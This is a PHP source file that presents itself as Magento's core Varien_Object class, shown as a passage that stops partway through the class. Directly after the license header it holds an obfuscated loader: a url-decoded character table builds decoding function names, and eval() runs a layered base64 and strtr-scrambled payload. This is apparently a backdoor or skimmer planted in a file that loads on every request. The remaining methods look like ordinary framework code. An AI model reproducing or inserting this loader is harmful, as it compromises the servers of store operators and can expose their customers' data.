<?php

/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magentocommerce.com for more information.
 *
 * @category   Varien
 * @package    Varien_Object
 * @copyright  Copyright (c) 2008 Irubin Consulting Inc. DBA Varien (http://www.varien.com)
 * @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 */

/**
 * Varien Object
 *
 * @category   Varien
 * @package    Varien_Object
 * @author      Magento Core Team <core@magentocommerce.com>
 */

$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}    
        .$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}    
        .$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};    
        eval($O00O0O("JE8wTzAwMD0iRXhrc0pPbm12WFlyaldsQUxjRmh5SWVIekNiU3BRZERVZktnYVpWQnRUTmlHdXdQcW9STXV5RkdlQ0R0aVphbldyWUh4UnFmRXBnSWprbWxKc1BoTVhVTlZjb0FTdlFLQkx3Yk9UemRiaDl3VklITmNEb0xhM3pKbTI0TmNaUTFVa3pXY0I5ZHNFRlVnRUhVZUJRRm0weWhiclA2VnI1dG1CcTBjbGZLYVpRWVFXelhjQm9XbTJ6WVVreldjQjlkc0VGSkN3VE5jdDlFVWt6SmJ2SDdlQkY4UjN6RW1Cb0xVa3pXY0I5ZHNFRjdlQkZuVUVGVXBJR1VlQlFGbTB5aHJFekpabEg5cEJRVFJLZmlSdHNUZUJRRm0weWhyRXpKWmxGU2RsRjdrS0E5a0tBRWNaejFSdDROZUJRRm0weWhDd1ROWHJvMmFyd1RjWlExVWtlRW9EcDNvbFNFbE1vMlFyZWpScXVpY01TRXYyZUpvMXFrZFlKeVBJZmNvclN4YTBRRFIyRjJNdGNCbE1xQW8wUVlvckpEZFphamF0cHd4alFNc01lQmQxZnNkWWNUZE05R3paZlNQWnBpUGw5MlJyZUpvRjEyQ01KTWNJekJNRjFRVTFjU2RCekJhRHpMdnFQMWNCekVjMmN4UTNRTGx2ZTVtWmVaUk16TG1XZDFjM0YxTU01cGQyYzJ2RmZmTUlmMFZGSll6dVlDc29QcmRoUUJjMWZHTWhmaVFGUEpkMjFjQ3FQQ29Eb0NQalB5ZFlvNUNaZU1vQm8yQ3VSNWdEZkxvdXo1b1dmRXJ0OUJkcjlGTVpvMFBXcXhNQjF5bUU5ZlJJcHl6MDkxclllNWRaejNscW9obGhkMWRNZlN2TXMzbW9mRG1EQUl6amR5ZGpjSWxJZXlhV2NLQ2hGNWRCRm5ydnpyeldOaU1CNWJjdWF3Y29jZG0xSmF2RFlMdkRlNFFvc25QRUd5UHJxRnZZZkdjSW9pb1pmQ3YyZmtQV3FFUjFQb3JyZDJRV2NDUnVTRmRab2ZvamVkb29keU1JZWxkSUpVVldQcmN2TjRNMHowcldxd1AyZG5VM1FaUTB6cWRFRzJRaHpvcnU5YmNCNXBjdGNVUEZKemx2UG9yWlQ1ckZZd1JEb3d6anFjeDBQT2xqb2Z4MWVHb3Fmd1Fab1Ntb2NLYTJRY2dGejNhV2M2bUZxSmdCNHlydTV1bzN6NUNNZkNkdG9EUnFKdU1aZmt6MlE1Y0lmanJGUUFRRnE1c01QNlIzY2tNV2ZaYTA1M2xaUDBzb3AxQ3VhMVBEb2lkdGU1bGpZM2dESlVNMVl1ZEZjVGdaYWptSXFCYzBlaENyUXpQalF1bW9lNGxGTTJvclF3b3Z6VmxNWTV2cVE0bU16U3Z1ZWN6dVRqYUZQS1AydWl6RnFmekZTR011UzNValFGUmphanZvZllvdFFrYzJmSWdXelFQMDloY0llMGFXZUdSb1I1bERvZWFvY3ZhbDliY2p6MXgyeXJhRHNuVlpNMHZqcURRTTh5UHZvYXYyb1FWMlBPekRlVnpaZUFndVFhZHZSeVJ1Sk96WkFrdkRZWmNqY25vdXpqYXRveG1ZZVpSMDVWckRkeVAyZTJNaGNHeDFkanZ0UTVDdlFxUW9vbFEwb1dsclFTTXZ6RFZJUEdNRjVDek1laG9ZUU9vdXppekZKT1ZvemNnRFlCbEZ6NU1EZU12M1BUbVpvbm0zSDBQSWVsejBSMGdCcXVsMUF4Vm9KTXJZZWpSMVF3bG9BdENxZDRjanFDTUJvRmwycXhvb0pUenRKcHNsU3VWWlFmbWp6cVZ1UHRnQjlVbTF6b2Mwemthb29BVTFQZXJ2QUVvRlkzY005Qm90b0ZWSW9BZ0llbENocDF6am9PUnRTcGFsOUtzMllucnFwbnZGNHlNdWNXbW9ZY2x2UFpScUFETUJKUWFEZnZRb3pMUHU4NUNvQTNyTUprUWhBM2dEcXJNMnlEbWpmUWdNY29Db01uVnJKMG1oekV6dlBqcnR5QmNJSk1vdTlRVk1zbmNEZVptcll0ZFdvQlBEZnVscjljZGtTcHpCNWVsV3pmcnR1RVZoekxtdHlMenZ6VVUxSnN2cjFXUXZQZU12UU1scncyZDJlVk1CZDRRRnpEY3ZmcXJJb3ZNcUpWejBRNmRFUzFjWVI0Q2hmQ2FGOXZQb3MxY2hlYW1FRzRNSXpiY1dldHpyeWthMFFDVTAweWxCb3FsMVRqUUZKRGN1UzBDdmZiUjF1MmxxWXhzTTVNTU1KZE12QTN2RGVzVTNvb3N2TWlkREoxTTJ1aVJZSmxQTUplZEZQMGRXUjFtcVE2UXFQMnpoTTRRclEwbXJxVnMycTVvMUFZb0lKYWwwOUVWb1BNY3JRMGNNTTVscmRFYWplU1Zxb3ptb1lmVjNmVmFEWUZRMDFVZDA5V3oweWtydUprUU1RV3p2cWFzWkFzQ0JmT2N0VDRSSUFxbFpmdWNaZDV6V2M0ZGw4d2RETTRRWWQwek1jRmN1Y2J6Rm9zbUJRalVqUFFSdVkzdmw5V0NvQUJvMHB5UDNKcHp2WXNDQnFWUXFQYmEyejJWMjV3Y0RZU2dNU2hsMjliZFpORXJvUVZtSVR3UHZvRlEwY1lSMllpVnVSamwxeml6TXlXVnJvT010MWRvcU1udnU4amEwekNQMk53VjNmdWNNWVZvdXowZ3JxNGdCUHdjMlNXb3IxZFAyNXNWME0yYVpRSlVqZUtsam9qcm9veWdvcTFkM2NlTXI1WngyeUxjSVRpUDF6VGNNRmp2WXFTY01Tb2QyZmxVam82Y3FzaW9yY0VsdWNJTTJjbFF2ZWFsMmVwb0ZQNXJ2ZTNSMVFGdlpOakNNVDBQV1AxUUljbngwcTNDb2VuZ3VRd2NXRjNWaFJ5TXJSM3NNNTJkQnFGTWhQWVBZejBRMmNzbUJ5VHpvZDB2MDVrTXZ6ZHMwU0ZhMHlFbzFRbnpXQVdQb1BlenRkNG1yNWtsSWZhUTNNM2dyOTJhWXMydld6R1JZUWtVMDExbTI5MGdNb2RzcmNDTW9hMlFvQXhzM0pBcnJTalFyNXVsQnFjenQ5V1AzRndsdmNUVkI0eU0yMWV2cW9KQ0JKc2dvYzNDa1NyUVd6b2RCUXNtRGQyQ29lZk1LU1NvV0Y1YTBZZWEwSnFVM0FLb3ZQU20yNUtkRlNEck1jWWdNVDNzdDliUUR6UWNaZkltWkFCYU1vWm1GU0pNMmM0bzJKUXYwb2NQcW81YXQ1VHpXUWpsaEE1VjJKcFZadTJsQmZLVmhld2xCY1RhM1BRbUlxMlJyemxWM1JqczI5bENCMXVNWUpCc1lRUVBqZGp2b3FLZ015em1aSmtvQm9Nb3JzNXMyNWVydWNHdllQaGdNMUV2Qm9VeDJxTVZ2YTJSMHl2c0Z6UWwwY0xzMnlaZ1plZHN0Y0xkMUpaTVdmRHpCSkRtdkF6djNRamQxWW9yWVBjZG9zMXZ0VHdQdVRuQ3FSeWRyb1FsRll4Y0lxSXpoQXp6SUYzQ01xRlBCU0FjRllXUXRjRFFyZnhvRm9sejJ6MWx2UWpQMEpNY2pjS3JCRkVjMVF5ejA1YU10d3dSMXU1enJQSXZ0eVptWm9DdnZINFJ0U1dhTTlDTTN6VmRoUFFNMWZ4dkJTS1Z2endNTVFLVmpxeVYwc3dtM1FDQ0I5eE1GODNNdVNXZFpZMW11b3l6MGVuejFkRXZySmRNTVNUcnJmUWxvUUdSdG93UnRxZU1xcXZ4MFR5bDBZRW9EY0dzb0Z5VkVHbmwyZUlNdFlWUFpmZFZGUFVtMW80UnV5V2ExUnl6aGNDVjJhMmNXenVQWnp4YXIxZXYwZTVNcVlzUnU1UW1vQUJsV2ZmejBxVmdxelNvaHpvbzBhRWNXUHdndEpVdm9ZZE0wSlNtMWVybU0xRHoxUVp6dGNabDNKangwdTBsb2ZjUldBZnJNMVp6b3pyYXJlNXNycTZRWnFzejNKVGNyeTFjQnlPb2p6TVBNSnhydlIxUHRxdGNocXVNRkc0ZGp6alFsU1NjaFlDcmhveXNvZWRvTTFaVjNNalZ1ZkJyRlNUTUZZQVJySkd2b3AwUXIxV3MzWUNydDlaZFdZM2xGMXNyWUFzVldxT2QzZm5ncWQwZEZRcmQzUVFjM1BUc1dZbGx1ZldzRjVNUTBxNWNxZVpRMmVLbE1ZWmMyUmlSdTQzY0lQWXJCeW5QRlBTbHFxRnZvUFZNanFmejFvRWEyUFl6dHlqUjJmZnN2b0R6MDU1dm9KWnpXQXhDTTRFTVlSMlAwMTFtM1Rqdmh6V3Z0U3lQQmZzcnZkaVZEUFdWdGZLdjFSMnhqUVdydDgwUTJxeWNaZkltdDVZUTJTTFJNRzFWSXFZUTNRc2EyYTVydDlFZFlQd2d2UVFvQnMxenJQUU0ycXRycWUwdm9kaU1aUm5taHFXUElQQ1EyWUJnSW9CUjFlRWRyUzRtdWNMVkRZYU1XcTR6MVB0TWhvc20xWWxvWUg0ejNZd2NCbzVjb2ZrVnZBeFZoZXNSMHo1UXFmRW9NZUF2SU01UmhIRWN1OXlRcjFKUTBZT2ExenFhV2M1c1pvcmN0ZkZhWmEwUDJRc1ZXdWlndXluY3VmR2xxb0Rnb0FaenFmbmMwc0VRanVqZ1pvMVBJWUdtdVBRYVlQYVZxejNhb2RFZ2hQMXgwcUpkV1IybGhQMVJJSmNncllFb3U1Wm9XZDJjMlFhc2xTdXpxUEttWWZLYTI1RlFNU3JvM0pjUjNBdmR1UDZ6dFBRdkZSMG8xSkt6RmZDVms5WnZGdzFQQll3VkRxQWNvejFWQlEzY3JxaFZoZm9tamN5bWhvNWd2QU1WM1lyY1lvbHp0emFzMWZXY001U29CODFnRGZwUDBvem8xZnlyazlUcllmVlZqTXd6b3prZ3RmMHpLODJNRFlDY0Y4MGEyWTJNcXFsb01TY1JNMG5VMDVocklxMVJCcW5kdGZvdmhjM3NNUWpndlBXY3Zma3pCY2xvdlF4VjA1SVUwNUVkRnp3ejA0MGQzZUZ4alBlenVKYVZxZUN4MVFJemw5Q3gxQUdRcVlUelpKUVYzZWVScUFMczBQZmdySjNndmQ1b2pRRmdJWXN6M29MZDJmMnJoTkVQWXN5UkZ5TWwzdTFDWkFrY0RSaVFJQVFsdHowQ2hZaGdGZkdhWlRuYVdSRVBNUEZjRk01bXQ1RW1NY2h2b1lpek1ja3N0NWV6dHlBTU01bE1ocXpQV1FyTXZ6ME1ZVHlRMFBwbUU4d29yZVlzV1BaejN6T3Z0eWpSRlFKVjJGd2N2bzNtRGZxTVlRNVBoUXBSck4xYzA5RFFCNTRvazlzbFpZaE1EQTBscjVKczBvT2dxWU1SdlFTVnFRWXJoTjNNaG9TUHZRTHpZYW5VMWF5ZEI0MHYyelZjazl5cnVRdmMzTTNkdmNFUjFmaUNCZnFNaFIxQ0l6YngwZkFNMFQxZHI1VVYwenZyWnA1UURZQVBCZnB2a1Nudm9BMmNqcW5kdEd3Z0lZV1ExQUtSdHFwUFpwNHYyUXJsSVRqZHZkM2NyRzVzV3MyZ1lKaU1qYzVkdU53c29vaW8xc3dQdU15Y3F1d2dsU1FRWm9Fc29RUVUzUVdWMmYxcllmU1BZWURNV2VsUVpOaWdyMUpNdVNEUjFBc29GVGlkWXNubTJzbk12WXNtSUhqY3RQVnMyZm5kME5qbDNQd01EY1NQSVkyVkZwaXMxVG5VMlNoVk1vSm9NekdVMkdpY1lKR2RZWXhjcXF1ekRkamdXUjVNTVNGempxMFUyNXZSdnF2Y0U4d2MzekpSMGVDUU1HaW9GNXBWdFlPUXJOeXpCem5yRFAxUllQZm1EZnZkdnFPeklhRVYyU0NyRkcxTUVTamdCb3dWMWNrbHRjdXZvUGJndnpUTVpmZnZxWVptb2NyYTFjZnoxZVZjdlBkUkJ6cm9GTW56cmV1ekJjMmN0eldDcjF3Y3JmS3NqUnlRM29GZHZmUVIwOVNsM2YzZ1pKdngzSm9DdnE2ZFpjdWxqQTZQWnUyUHRxT1UxcUFRMDU0Y3RQMlJNUU1NQjloUXRmelFGenFSbFNxdk01RG92UEJRcjFTVnVjV3ZyMVNhRjR5Z0JKRFJJek1zMmZpenVhamRrU0xvMGE0UHJKMnowZm5SaEh3Z29vRE1NMDFNTUpNUnQ1ZnJCejRzMkd3bFpjSVJqczRzMlA1cnVRdnYwTjVNaG8yclpjcGRocU1ncm9VVkRBY1AzUDJydDU0eklKaFAxb09NaGV1TWpRV2xxUndvMGVsc01leGx0UTBsMkc0UnVHM21ab3dzWWV0eDNxRHZvUHFRRjEwdkl6Q1Z1UGpkMFlGZ1pZV00yOTVWV0YwejB5b3oyOTRSa1NNUUlKU2NaUFNtQjgwbDBTUWdESG5NSXN5bFlZeFBCU3J2ME1FczFxVVFvZWpRaHFiczA5U1UyZkdtb2VkcnRQa3ZEYTNtRnNqck1jbm10enhVMW9xdmhmck1rU3NncXpGZE1RM3ZvUGlnb0h5czBTdk1rU1Fkb0FJTXFBUWFNY1Vnb0hFUHVTU1BGUTJzMXEwTXRZVXJobzBhWmNFVk1zd1JJemxkSzhFUVd6ZnZyMU1yRllLdldxeXZyZkNtMU55cm9Kbmd1b09vdDQ1bTI4NENNOUJzMHF3VTJhRWMxUjVhb1lCUkJ5NFBXY0p6b0h5Q3U1cmQwSjJNMHFLTVp1amRJQUdRRjE1dnQ1NFAySk9kRGVvVjFNd2xJUDFvMFlHZ01wMFIzQTVDazlwVkRmYVIwTjJtQmVyb3U0aWdNMWlNWnFVemhRYmwxZnhzallZUEI1S1FGcDBNWkpMdmpjamNCZVRkdFJpUEZjaWQzYzNjMHNuY1l6SWR0UWptV2VXekRxZk1vTm5RdVB0b1dldGwzb2JnRFl2bHVTNU1GNUxjb2VlVWpmVHNyY0VyWlFPbDFlYWxqelNNV2N1ell6V1Z2UXBkaGU1Z0I1d2MzSnZkMjF4bGhvcnYxZnRhRk4xbHFRNVZCMG5WcXFBZDBkNFJ0OUdyQjF0bHJ3eXpNUHBQSUozbGpSMUN2QWZtRnlxeldxZFJqUWxRTW9xY3VmNXowcUpDb1FvdmhjRmdyUHhjRm9Gc3IxRmRaUXZ2a1NkUldRT21Jb2hkdXluZDBmNlFCczBNdmZDZ3VwRWN1UDFWMlNTUXFjNXJGSmVNakFyTXVHbnMyMXN6RlNrUjBxT2NESnJtMkpNYXJORWd2ZnlsQlkwUU01NWdCOW5VM2N6dlpBVG11UndNRjlsVlplYW8yZnlvdFA0c1lja21NNVRzMG9jYUZzMGNJSm9QWnN5YW9jT3ZvSkNjb1F3czN6U3JvemRDdTVEcklmM1ZxWTZscXo1bXRxY2xZSGpvRHBpUXZwMmxoenRNWkFHZDNBSVFZWUNtM1l6UVljbE1JZWNhWkZFUjFRZHYwNWp2MHcxVTNNNWRqQVNkdmZCbDFvM1JCNGlsMXFoVldGaWQzWWRQMFRueDJvQ2RXZUJ2TXpJTUJkaXBLRkpDajgrIjsgIAogICAgICAgIGV2YWwoJz8+Jy4kTzAwTzBPKCRPME9PMDAoJE9PME8wMCgkTzBPMDAwLCRPTzAwMDAqMiksJE9PME8wMCgkTzBPMDAwLCRPTzAwMDAsJE9PMDAwMCksICAgIAogICAgICAgICRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));
        
class Varien_Object implements ArrayAccess
{

    /**
     * Object attributes
     *
     * @var array
     */
    protected $_data = array();

    /**
     * Data changes flag (true after setData|unsetData call)
     * @var $_hasDataChange bool
     */
    protected $_hasDataChanges = false;

    /**
    * Original data that was loaded
    *
    * @var array
    */
    protected $_origData;

    /**
     * Name of object id field
     *
     * @var string
     */
    protected $_idFieldName = null;

    /**
     * Setter/Getter underscore transformation cache
     *
     * @var array
     */
    protected static $_underscoreCache = array();

    /**
     * Object delete flag
     *
     * @var boolean
     */
    protected $_isDeleted = false;

    /**
     * Map short fields names to its full names
     *
     * @var array
     */
    protected $_oldFieldsMap = array();

    /**
     * Map of fields to sync to other fields upon changing their data
     */
    protected $_syncFieldsMap = array();

    /**
     * Constructor
     *
     * By default is looking for first argument as array and assignes it as object attributes
     * This behaviour may change in child classes
     *
     */
    public function __construct()
    {
        $this->_initOldFieldsMap();
        if ($this->_oldFieldsMap) {
            $this->_prepareSyncFieldsMap();
        }

        $args = func_get_args();
        if (empty($args[0])) {
            $args[0] = array();
        }
        $this->_data = $args[0];
        $this->_addFullNames();

        $this->_construct();
    }

    protected function _addFullNames()
    {
        $existedShortKeys = array_intersect($this->_syncFieldsMap, array_keys($this->_data));
        if (!empty($existedShortKeys)) {
            foreach ($existedShortKeys as $key) {
                $fullFieldName = array_search($key, $this->_syncFieldsMap);
                $this->_data[$fullFieldName] = $this->_data[$key];
            }
        }
    }

    /**
     * Inits mapping array of object's previously used fields to new fields.
     * Must be overloaded by descendants to set concrete fields map.
     *
     * @return Varien_Object
     */
    protected function _initOldFieldsMap()
    {

    }

    /**
     * Called after old fields are inited. Forms synchronization map to sync old fields and new fields
     * between each other.
     *
     * @return Varien_Object
     */
    protected function _prepareSyncFieldsMap()
    {
        $old2New = $this->_oldFieldsMap;
        $new2Old = array_flip($this->_oldFieldsMap);
        $this->_syncFieldsMap = array_merge($old2New, $new2Old);
        return $this;
    }

    /**
     * Internal constructor not depended on params. Can be used for object initialization
     */
    protected function _construct()
    {
    }

    /**
     * Set _isDeleted flag value (if $isDeleted param is defined) and return current flag value
     *
     * @param boolean $isDeleted
     * @return boolean
     */
    public function isDeleted($isDeleted=null)
    {
        $result = $this->_isDeleted;
        if (!is_null($isDeleted)) {
            $this->_isDeleted = $isDeleted;
        }
        return $result;
    }

    /**
     * Get data change status
     *
     * @return bool
     */
    public function hasDataChanges()
    {
        return $this->_hasDataChanges;
    }

    /**
     * set name of object id field
     *
     * @param   string $name
     * @return  Varien_Object
     */
    public function setIdFieldName($name)
    {
        $this->_idFieldName = $name;
        return $this;
    }

    /**
     * Retrieve name of object id field
     *
     * @param   string $name
     * @return  Varien_Object
     */
    public function getIdFieldName()
    {
        return $this->_idFieldName;
    }

    /**
     * Retrieve object id
     *
     * @return mixed
     */
    public function getId()
    {
        if ($this->getIdFieldName()) {
            return $this->_getData($this->getIdFieldName());
        }
        return $this->_getData('id');
    }

    /**
     * Set object id field value
     *
     * @param   mixed $value
     * @return  Varien_Object
     */
    public function setId($value)
    {
        if ($this->getIdFieldName()) {
            $this->setData($this->getIdFieldName(), $value);
        } else {
            $this->setData('id', $value);
        }
        return $this;
    }

    /**
     * Add data to the object.
     *
     * Retains previous data in the object.
     *
     * @param array $arr
     * @return Varien_Object
     */
    public function addData(array $arr)
    {
        foreach($arr as $index=>$value) {
            $this->setData($index, $value);
        }
        return $this;
    }

    /**
     * Overwrite data in the object.
     *
     * $key can be string or array.
     * If $key is string, the attribute value will be overwritten by $value
     *
     * If $key is an array, it will overwrite all the data in the object.
     *
     * @param string|array $key
     * @param mixed $value
     * @return Varien_Object
     */
    public function setData($key, $value=null)
    {
        $this->_hasDataChanges = true;
        if(is_array($key)) {
            $this->_data = $key;
            $this->_addFullNames();
        } else {
            $this->_data[$key] = $value;
            if (isset($this->_syncFieldsMap[$key])) {
                $fullFieldName = $this->_syncFieldsMap[$key];
                $this->_data[$fullFieldName] = $value;
            }
        }
        return $this;
    }

    /**
     * Unset data from the object.
     *
     * $key can be a string only. Array will be ignored.
     *
     * @param string $key
     * @return Varien_Object
     */
    public function unsetData($key=null)
    {
        $this->_hasDataChanges = true;
        if (is_null($key)) {
            $this->_data = array();
        } else {
            unset($this->_data[$key]);
            if (isset($this->_syncFieldsMap[$key])) {
                $fullFieldName = $this->_syncFieldsMap[$key];
                unset($this->_data[$fullFieldName]);
            }
        }
        return $this;
    }

    /**
     * Unset old fields data from the object.
     *
     * $key can be a string only. Array will be ignored.
     *
     * @param string $key
     * @return Varien_Object
     */
    public function unsetOldData($key=null)
    {
        if (is_null($key)) {
            foreach ($this->_oldFieldsMap as $key => $newFieldName) {
                unset($this->_data[$key]);
            }
        } else {
            unset($this->_data[$key]);
        }
        return $this;
    }

    /**
     * Retrieves data from the object
     *
     * If $key is empty will return all the data as an array
     * Otherwise it will return value of the attribute specified by $key
     *
     * If $index is specified it will assume that attribute data is an array
     * and retrieve corresponding member.
     *
     * @param string $key
     * @param string|int $index
     * @return mixed
     */
    public function getData($key='', $index=null)
    {
        if (''===$key) {
            return $this->_data;
        }

        $default = null;

        // accept a/b/c as ['a']['b']['c']
        if (strpos($key,'/')) {
            $keyArr = explode('/', $key);
            $data = $this->_data;
            foreach ($keyArr as $i=>$k) {
                if ($k==='') {
                    return $default;
                }
                if (is_array($data)) {
                    if (!isset($data[$k])) {
                        return $default;
                    }
                    $data = $data[$k];
                } elseif ($data instanceof Varien_Object) {
                    $data = $data->getData($k);
                } else {
                    return $default;
                }
            }
            return $data;
        }

        // legacy functionality for $index
        if (isset($this->_data[$key])) {
            if (is_null($index)) {
                return $this->_data[$key];
            }

            $value = $this->_data[$key];
            if (is_array($value)) {
                //if (isset($value[$index]) && (!empty($value[$index]) || strlen($value[$index]) > 0)) {
                /**
                 * If we have any data, even if it empty - we should use it, anyway
                 */
                if (isset($value[$index])) {
                    return $value[$index];
                }
                return null;
            } elseif (is_string($value)) {
                $arr = explode("\n", $value);
                return (isset($arr[$index]) && (!empty($arr[$index]) || strlen($arr[$index]) > 0))
                    ? $arr[$index] : null;
            } elseif ($value instanceof Varien_Object) {
                return $value->getData($index);
            }
            return $default;
        }
        return $default;
    }

    /**
     * Get value from _data array without parse key
     *
     * @param   string $key
     * @return  mixed
     */
    protected function _getData($key)
    {
        return isset($this->_data[$key]) ? $this->_data[$key] : null;
    }

    /**
     * Set object data with calling setter method
     *
     * @param string $key
     * @param mixed $args
     * @return Varien_Object
     */
    public function setDataUsingMethod($key, $args=array())
    {
        $method = 'set'.$this->_camelize($key);
        $this->$method($args);
        return $this;
    }

    /**
     * Get object data by key with calling getter method
     *
     * @param string $key
     * @param mixed $args
     * @return mixed
     */
    public function getDataUsingMethod($key, $args=null)
    {
        $method = 'get'.$this->_camelize($key);
        return $this->$method($args);
    }

    /**
     * Fast get data or set default if value is not available
     *
     * @param string $key
     * @param mixed $default
     * @return mixed
     */
    public function getDataSetDefault($key, $default)
    {
        if (!isset($this->_data[$key])) {
            $this->_data[$key] = $default;
        }
        return $this->_data[$key];
    }

    /**
     * If $key is empty, checks whether there's any data in the object
     * Otherwise checks if the specified attribute is set.
     *
     * @param string $key
     * @return boolean
     */
    public function hasData($key='')
    {
        if (empty($key) || !is_string($key)) {
            return !empty($this->_data);
        }
        return array_key_exists($key, $this->_data);
    }

    /**
     * Convert object attributes to array
     *
     * @param  array $arrAttributes array of required attributes
     * @return array
     */
    public function __toArray(array $arrAttributes = array())
    {
        if (empty($arrAttributes)) {
            return $this->_data;
        }

        $arrRes = array();
        foreach ($arrAttributes as $attribute) {
            if (isset($this->_data[$attribute])) {
                $arrRes[$attribute] = $this->_data[$attribute];
            }
            else {
                $arrRes[$attribute] = null;
            }
        }
        return $arrRes;
    }

    /**
     * Public wrapper for __toArray
     *
     * @param array $arrAttributes
     * @return array
     */
    public function toArray(array $arrAttributes = array())
    {
        return $this->__toArray($arrAttributes);
    }

    /**
     * Set required array elements
     *
     * @param   array $arr
     * @param   array $elements
     * @return  array
     */
    protected function _prepareArray(&$arr, array $elements=array())
    {
        foreach ($elements as $element) {
            if (!isset($arr[$element])) {
                $arr[$element] = null;
            }
        }
        return $arr;
    }

    /**
     * Convert object attributes to XML
     *
     * @param  array $arrAttributes array of required attributes
     * @param string $rootName name of the root element
     * @return string
     */
    protected function __toXml(array $arrAttributes = array(), $rootName = 'item', $addOpenTag=false, $addCdata=true)
    {
        $xml = '';
        if ($addOpenTag) {
            $xml.= '<?xml version="1.0" encoding="UTF-8"?>'."\n";
        }
        if (!empty($rootName)) {
            $xml.= '<'.$rootName.'>'."\n";
        }
        $xmlModel = new Varien_Simplexml_Element('<node></node>');
        $arrData = $this->toArray($arrAttributes);
        foreach ($arrData as $fieldName => $fieldValue) {
            if ($addCdata === true) {
                $fieldValue = "<![CDATA[$fieldValue]]>";
            } else {
                $fieldValue = $xmlModel->xmlentities($fieldValue);
            }
            $xml.= "<$fieldName>$fieldValue</$fieldName>"."\n";
        }
        if (!empty($rootName)) {
            $xml.= '</'.$rootName.'>'."\n";
        }
        return $xml;
    }

    /**
     * Public wrapper for __toXml
     *
     * @param array $arrAttributes
     * @param string $rootName
     * @return string
     */
    public function toXml(array $arrAttributes = array(), $rootName = 'item', $addOpenTag=false, $addCdata=true)
    {
        return $this->__toXml($arrAttributes, $rootName, $addOpenTag, $addCdata);
    }

    /**
     * Convert object attributes to JSON
     *
     * @param  array $arrAttributes array of required attributes
     * @return string
     */
    protected function __toJson(array $arrAttributes = array())
    {
        $arrData = $this->toArray($arrAttributes);
        $json = Zend_Json::encode($arrData);
        return $json;
    }

    /**
     * Public wrapper for __toJson
     *
     * @param array $arrAttributes
     * @return string
     */
    public function toJson(array $arrAttributes = array())
    {
        return $this->__toJson($arrAttributes);
    }

    /**
     * Convert object attributes to string
     *
     * @param  array  $arrAttributes array of required attributes
     * @param  string $valueSeparator
     * @return string
     */
//    public function __toString(array $arrAttributes = array(), $valueSeparator=',')
//    {
//        $arrData = $this->toArray($arrAttributes);
//        return implode($valueSeparator, $arrData);
//    }

    /**
     * Public wrapper for __toString
     *
     * Will use $format as an template and substitute {{key}} for attributes
     *
     * @param string $format
     * @return string
     */
    public function toString($format='')
    {
        if (empty($format)) {
            $str = implode(', ', $this->getData());
        } else {
            preg_match_all('/\{\{([a-z0-9_]+)\}\}/is', $format, $matches);
            foreach ($matches[1] as $var) {
                $format = str_replace('{{'.$var.'}}', $this->getData($var), $format);
            }
            $str = $format;
        }
        return $str;
    }

    /**
     * Set/Get attribute wrapper
     *
     * @param   string $method
     * @param   array $args
     * @return  mixed
     */
    public function __call($method, $args)
    {
        switch (substr($method, 0, 3)) {
            case 'get' :
                //Varien_Profiler::start('GETTER: '.get_class($this).'::'.$method);
                $key = $this->_underscore(substr($method,3));
                $data = $this->getData($key, isset($args[0]) ? $args[0] : null);
                //Varien_Profiler::stop('GETTER: '.get_class($this).'::'.$method);
                return $data;

            case 'set' :
                //Varien_Profiler::start('SETTER: '.get_class($this).'::'.$method);
                $key = $this->_underscore(substr($method,3));
                $result = $this->setData($key, isset($args[0]) ? $args[0] : null);
                //Varien_Profiler::stop('SETTER: '.get_class($this).'::'.$method);
                return $result;

            case 'uns' :
                //Varien_Profiler::start('UNS: '.get_class($this).'::'.$method);
                $key = $this->_underscore(substr($method,3));
                $result = $this->unsetData($key);
                //Varien_Profiler::stop('UNS: '.get_class($this).'::'.$method);
                return $result;

            case 'has' :
                //Varien_Profiler::start('HAS: '.get_class($this).'::'.$method);
                $key = $this->_underscore(substr($method,3));
                //Varien_Profiler::stop('HAS: '.get_class($this).'::'.$method);
                return isset($this->_data[$key]);
        }
        throw new Varien_Exception("Invalid method ".get_class($this)."::".$method."(".print_r($args,1).")");
    }

    /**
     * Attribute getter (deprecated)
     *
     * @param string $var
     * @return mixed
     */

    public function __get($var)
    {
        $var = $this->_underscore($var);
        return $this->getData($var);
    }

    /**
     * Attribute setter (deprecated)
     *
     * @param string $var
     * @param mixed $value
     */
    public function __set($var, $value)
    {
        $var = $this->_underscore($var);
        $this->setData($var, $value);
    }

    /**
     * checks whether the object is empty
     *
     * @return boolean
     */
    public function isEmpty()
    {
        if (empty($this->_data)) {
            return true;
        }
        return false;
    }

    /**
     * Converts field names for setters and geters
     *
     * $this->setMyField($value) === $this->setData('my_field', $value)
     * Uses cache to eliminate unneccessary preg_replace
     *
     * @param string $name
     * @return string
     */
    protected function _underscore($name)
    {
        if (isset(self::$_underscoreCache[$name])) {
            return self::$_underscoreCache[$name];
        }
        #Varien_Profiler::start('underscore');
        $result = strtolower(preg_replace('/(.)([A-Z])/', "$1_$2", $name));
        #Varien_Profiler::stop('underscore');
        self::$_underscoreCache[$name] = $result;
        return $result;
    }

    protected function _camelize($name)
    {
        return uc_words($name, '');
    }

    /**
     * serialize object attributes
     *
     * @param   array $attributes
     * @param   string $valueSeparator
     * @param   string $fieldSeparator
     * @param   string $quote
     * @return  string
     */
